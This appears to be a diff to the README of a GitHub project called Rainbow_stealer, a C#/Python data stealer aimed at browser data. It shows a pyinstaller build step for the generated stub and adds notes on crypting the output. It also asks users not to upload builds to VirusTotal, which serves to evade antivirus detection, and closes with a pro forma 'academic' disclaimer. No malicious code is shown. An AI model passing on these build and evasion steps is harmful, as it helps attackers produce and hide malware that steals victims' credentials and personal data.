@@ -14,6 +14,11 @@ Rainbow is data stealer coded in C#/Python. The use ranges from stealing browser
 ![alt text](https://github.com/remix30303/Rainbow_stealer/blob/master/build.png)
 3. In the current directory file called "stub2.py" will appear. You need to compile it using command:           
 `pyinstaller --onefile stub2.py`
-
+### Important Information
+* Created file is crypted. If you want to crypt it you need crypter. PythonCrypter coming soon :D
+* Please do not upload to websitest that distribute files. Example: virustotal.com
+* Want more features? Please write in issue section.
+### Disclaimer
+*This project is purely academic, use at your own risk. I do not encourage in any way the use of this software illegally or to attack targets without their previous authorization.*
 
   
